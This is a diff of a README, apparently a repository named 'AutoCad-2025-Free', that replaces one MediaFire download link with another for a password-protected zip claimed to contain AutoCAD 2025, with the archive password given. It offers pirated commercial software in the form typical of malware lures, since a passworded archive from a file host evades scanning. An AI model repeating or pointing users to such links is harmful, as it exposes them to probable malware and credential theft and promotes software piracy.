@@ -1,6 +1,6 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://www.mediafire.com/file/864g5i0xw5ptttg/AutoCad2025.zip/file)
+[Click here to Download](https://www.mediafire.com/file/q7fgqig3wvqbjwb/AutoCAD2025.zip/file)
 
 
 [Pass : S0f4fr33!]
